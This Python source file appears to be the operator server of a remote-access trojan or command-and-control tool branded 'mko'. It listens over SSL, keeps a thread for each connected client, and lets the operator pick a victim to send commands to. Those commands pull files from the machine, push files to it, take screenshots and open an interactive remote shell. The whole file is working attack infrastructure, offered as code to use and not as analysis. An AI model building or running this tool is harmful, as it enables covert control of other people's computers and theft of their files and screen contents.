import queue
import socket
import ssl
import threading
import random

import lib
from command_controller import Client

server_host = '0.0.0.0'
server_port = 1234
max_number_of_connections = 5

threads = {}
clients = []
client_queues = {}
thread_to_conn = {}

context_manager = None  # Context manager to know in which context the program is running (client or manager)
connection_allowed = True

# Charger les fichiers de certificats SSL
context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')


def handle_client(conn, addr, command_queue):
    global connection_allowed
    global context_manager
    print(f"\n[+] New connection with {addr[0]}:{addr[1]}")

    if context_manager is None:
        lib.print_mko_prefix()
    else:
        lib.print_mko_client(context_manager)

    current_thread = threading.current_thread()

    client_os = conn.recv(1024).decode('utf-8')
    client = Client(client_os)

    while connection_allowed:
        try:
            # Check if there are any commands to send to the client
            if not command_queue.empty():
                # prepare the command
                command = command_queue.get()
                command = command.replace('"', '')
                command = client.command_controller(command.lower())

                # Send the command to the client
                if command != "shell":
                    if command != "help" and \
                            command != "unknown" and \
                            command != "error":

                        conn.send(command.encode('utf-8'))

                        if command.startswith("upload"):
                            file_path = command.split(" ")[1]
                            lib.upload_file(file_path, conn)

                        if command.startswith("download"):
                            file_path = command.split(" ")[1]
                            lib.download_file(file_path, conn)

                        if command == "screenshot":
                            # random str (8char) to avoid conflict
                            random_str = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
                            screenshot_path = f"screenshot_{random_str}.png"
                            screenshot_status = conn.recv(1024).decode('utf-8')
                            if screenshot_status == "NOK":
                                pass
                                # print("[-] No display detected on client")
                                # lib.print_mko_client(current_thread.ident)
                            elif screenshot_status == "ok":
                                lib.download_file(screenshot_path, conn)

                        # If the command is "close", close the connection
                        if command == "close":
                            break

                        # Receive the output of the command
                        message = conn.recv(1024).decode('utf-8')
                        if not message:
                            break
                        print(f"{message}\n")

                    lib.print_mko_client(current_thread.ident)

        except socket.timeout:
            conn.send("close".encode('utf-8'))
            continue

    print(f"\n[+] Connection closed with {addr[0]}:{addr[1]}")

    if context_manager is None:
        lib.print_mko_prefix()
    else:
        if context_manager == current_thread.ident:
            context_manager = None
            lib.print_mko_prefix()
        else:
            lib.print_mko_client(context_manager)

    conn.close()
    clients.pop(clients.index((conn, addr)))
    client_queues.pop(conn)


def accept_clients(s):
    global connection_allowed
    while connection_allowed:
        try:
            s.settimeout(1)
            conn, addr = s.accept()
            conn = context.wrap_socket(conn, server_side=True)  # Envelopper le socket avec SSL
            clients.append((conn, addr))

            # Create a new queue for this client
            command_queue = queue.Queue()
            client_queues[conn] = command_queue

            thread = threading.Thread(target=handle_client, args=(conn, addr, command_queue))

            # Prepare to store the next thread ID
            if len(threads) == 0:
                next_thread_id = 0
            else:
                next_thread_id = max(threads.keys()) + 1

            # Start the thread
            thread.start()

            # Store the thread ID
            id_thread = thread.ident
            threads[next_thread_id] = id_thread
            thread_to_conn[id_thread] = conn
        except socket.timeout:
            continue


# Function to interact with the terminal and choose a thread
def command_line_interface():
    global connection_allowed
    global context_manager
    lib.print_mko_prefix()

    while True:
        command = input()

        if command.startswith("use"):
            try:

                thread_id_from_command = int(command.split()[1])
                thread_id = None
                thread_index = None

                if thread_id_from_command in thread_to_conn:
                    # Get the thread ID with the value
                    thread_id = thread_id_from_command

                    # Get the thread index with the value
                    for key, value in threads.items():
                        if value == thread_id:
                            thread_index = key
                            break

                elif thread_id_from_command in threads:
                    thread_id = threads[thread_id_from_command]
                    thread_index = thread_id_from_command

                if thread_id is not None:

                    context_manager = thread_id
                    command_queue_manager = lib.use_manager(thread_id, thread_to_conn, client_queues)

                    if command_queue_manager == "close":
                        threads.pop(thread_index)
                        thread_to_conn.pop(thread_id)

                    elif command_queue_manager == "shell":
                        lib.interact_shell(thread_to_conn[thread_id], thread_id)

                    lib.print_mko_prefix()
                    context_manager = None

                else:
                    print(f"No thread found with ID {thread_id}")
                    lib.print_mko_prefix()

            except Exception as e:
                print(f"An error occurred")
                print("Unknown command. Try 'use <ID>' or 'list' to list all threads.")
                lib.print_mko_prefix()

        elif command == "list":
            print("ID   TID   \n--   ---  ")
            for thread_id in threads:
                print(f"{thread_id}   {threads[thread_id]}")
            print("\n")
            lib.print_mko_prefix()

        elif command == "exit":
            print("Exiting...")
            connection_allowed = False
            break

        elif command == "help" or command == "?" or command == "h" or command == "H" or command == "HELP":
            lib.print_help_manager()
            lib.print_mko_prefix()

        else:
            lib.print_mko_prefix()


def main():
    # display the banner
    lib.print_mko_banner()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((server_host, server_port))
    s.listen(max_number_of_connections)

    print(f"[+] Waiting for connection on port {server_port}...")

    accept_thread = threading.Thread(target=accept_clients, args=(s,))
    accept_thread.start()

    # Display threads control information - GUI
    command_line_interface()

    for conn, addr in clients:
        # send exit to each client
        conn.send("exit".encode('utf-8'))
        conn.close()

    print("\nServer closed.")


if __name__ == "__main__":
    main()
